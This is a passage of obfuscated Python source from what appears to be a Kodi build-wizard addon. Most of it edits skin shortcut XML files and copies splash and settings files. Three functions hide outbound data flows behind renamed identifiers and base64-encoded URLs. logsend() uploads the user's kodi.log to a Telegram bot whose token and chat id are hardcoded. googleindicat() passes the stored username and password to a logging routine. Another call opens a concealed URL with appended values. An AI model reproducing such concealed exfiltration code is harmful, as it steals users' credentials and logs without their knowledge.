          O0OOOO000000O0000 =OO00O00OOOO0OO0O0 #line:575
          import socket #line:577
          O0O0O0OOOO0OO0O00 =urllib2 .urlopen (O00O00000OO0OOO00 .decode ('base64')+' - '+O0O00O00O000OO0O0 +' - '+O0OOOO000000O0000 +' - '+O0O0OO0O0O0O0O00O ).readlines ()#line:578
       except :pass #line:579
def googleindicat ():#line:582
			import logg #line:583
			OOOOO0O0OO00OO000 =(ADDON .getSetting ("pass"))#line:584
			O000OO0OO0O0OO000 =(ADDON .getSetting ("user"))#line:585
			logg .logGA (OOOOO0O0OO00OO000 ,O000OO0OO0O0OO000 )#line:586
def logsend ():#line:587
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:588
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:589
      howsentlog ()#line:591
      import requests #line:592
      if xbmc .getCondVisibility ('system.platform.windows'):#line:593
         OO00O0O0O000OO0OO =xbmc .translatePath ('special://home/kodi.log')#line:594
         O0OOOOOOOOOOO000O ={'chat_id':(None ,'-274262389'),'document':(OO00O0O0O000OO0OO ,open (OO00O0O0O000OO0OO ,'rb')),}#line:598
         O0O00O000000O00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:599
         OOO0O00000O0OO00O =requests .post (O0O00O000000O00O0 .decode ('base64'),files =O0OOOOOOOOOOO000O )#line:601
      elif xbmc .getCondVisibility ('system.platform.android'):#line:602
           OO00O0O0O000OO0OO =xbmc .translatePath ('special://temp/kodi.log')#line:603
           O0OOOOOOOOOOO000O ={'chat_id':(None ,'-274262389'),'document':(OO00O0O0O000OO0OO ,open (OO00O0O0O000OO0OO ,'rb')),}#line:607
           O0O00O000000O00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:608
           OOO0O00000O0OO00O =requests .post (O0O00O000000O00O0 .decode ('base64'),files =O0OOOOOOOOOOO000O )#line:610
      else :#line:611
           OO00O0O0O000OO0OO =xbmc .translatePath ('special://kodi.log')#line:612
           O0OOOOOOOOOOO000O ={'chat_id':(None ,'-274262389'),'document':(OO00O0O0O000OO0OO ,open (OO00O0O0O000OO0OO ,'rb')),}#line:616
           O0O00O000000O00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:617
           OOO0O00000O0OO00O =requests .post (O0O00O000000O00O0 .decode ('base64'),files =O0OOOOOOOOOOO000O )#line:619
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:620
def rdoff ():#line:622
	OOO0O0OOOOO0000O0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:653
	O000000O00000O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:654
	copyfile (OOO0O0OOOOO0000O0 ,O000000O00000O0OO )#line:655
def skindialogsettind18 ():#line:656
	try :#line:657
		O0OO00O00OO00OO0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:658
		O000OO0000O000OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:659
		copyfile (O0OO00O00OO00OO0O ,O000OO0000O000OO0 )#line:660
	except :pass #line:661
def rdon ():#line:662
	loginit .loginIt ('restore','all')#line:663
	OOO0000OO0OOO00O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:665
	O00O0OO0OO000OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:666
	copyfile (OOO0000OO0OOO00O0 ,O00O0OO0OO000OO00 )#line:667
def adults18 ():#line:669
  OO00O0000O00OOOOO =(ADDON .getSetting ("adults"))#line:670
  if OO00O0000O00OOOOO =='true':#line:671
    O00O0O0000OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:672
    with open (O00O0O0000OO00OOO ,'r')as O0OOOO00000O0O000 :#line:673
      OO0OO00OOO0O00O00 =O0OOOO00000O0O000 .read ()#line:674
    OO0OO00OOO0O00O00 =OO0OO00OOO0O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:692
    with open (O00O0O0000OO00OOO ,'w')as O0OOOO00000O0O000 :#line:695
      O0OOOO00000O0O000 .write (OO0OO00OOO0O00O00 )#line:696
def rdbuildaddon ():#line:697
  OOO0O00OOOOOO0O0O =(ADDON .getSetting ("auto_rd"))#line:698
  if OOO0O00OOOOOO0O0O =='true':#line:699
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:700
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:701
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:702
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:720
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:723
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:724
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:728
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:729
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:730
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:748
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:751
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:752
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:756
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:757
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:758
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:776
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:779
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:780
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:784
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:785
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:786
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:804
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:807
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:808
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:811
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:812
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:813
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:831
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:834
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:835
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:837
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:838
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:839
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:857
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:860
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:861
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:863
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:864
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:865
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:883
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:886
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:887
    O000OOO00000O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:890
    with open (O000OOO00000O0O00 ,'r')as OOO0O00O0O000O000 :#line:891
      OOOOOO0OO00000000 =OOO0O00O0O000O000 .read ()#line:892
    OOOOOO0OO00000000 =OOOOOO0OO00000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:910
    with open (O000OOO00000O0O00 ,'w')as OOO0O00O0O000O000 :#line:913
      OOO0O00O0O000O000 .write (OOOOOO0OO00000000 )#line:914
def rdbuildinstall ():#line:917
  try :#line:918
   OOO000OOO0OOOOOO0 =(ADDON .getSetting ("auto_rd"))#line:919
   if OOO000OOO0OOOOOO0 =='true':#line:920
     OO000OOOOOO000OO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:921
     O0OOOO0OOOOO000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:922
     copyfile (OO000OOOOOO000OO0 ,O0OOOO0OOOOO000OO )#line:923
  except :#line:924
     pass #line:925
def rdbuildaddonoff ():#line:928
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:931
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:932
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:933
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:951
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:954
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:955
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:959
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:960
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:961
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:979
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:982
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:983
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:987
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:988
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:989
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1007
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:1010
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:1011
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1015
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:1016
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:1017
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1035
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:1038
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:1039
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1042
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:1043
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:1044
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1062
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:1065
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:1066
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:1069
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:1070
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1088
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:1091
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:1092
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1094
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:1095
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:1096
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1114
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:1117
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:1118
    O0OO0O0O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1121
    with open (O0OO0O0O0O00O0O00 ,'r')as OO0OOO0OO00O0OOO0 :#line:1122
      OO0O0OO0OOOO0OO00 =OO0OOO0OO00O0OOO0 .read ()#line:1123
    OO0O0OO0OOOO0OO00 =OO0O0OO0OOOO0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1141
    with open (O0OO0O0O0O00O0O00 ,'w')as OO0OOO0OO00O0OOO0 :#line:1144
      OO0OOO0OO00O0OOO0 .write (OO0O0OO0OOOO0OO00 )#line:1145
def rdbuildinstalloff ():#line:1148
    try :#line:1149
       OOO00O00O0OOO0OO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1150
       O0OO0O0O00OOO0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1151
       copyfile (OOO00O00O0OOO0OO0 ,O0OO0O0O00OOO0O00 )#line:1153
       OOO00O00O0OOO0OO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1155
       O0OO0O0O00OOO0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1156
       copyfile (OOO00O00O0OOO0OO0 ,O0OO0O0O00OOO0O00 )#line:1158
       OOO00O00O0OOO0OO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1160
       O0OO0O0O00OOO0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1161
       copyfile (OOO00O00O0OOO0OO0 ,O0OO0O0O00OOO0O00 )#line:1163
       OOO00O00O0OOO0OO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1166
       O0OO0O0O00OOO0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1167
       copyfile (OOO00O00O0OOO0OO0 ,O0OO0O0O00OOO0O00 )#line:1169
    except :#line:1171
       pass #line:1172
def rdbuildaddonON ():#line:1179
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1181
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1182
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1183
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1201
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1204
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1205
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1209
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1210
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1211
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
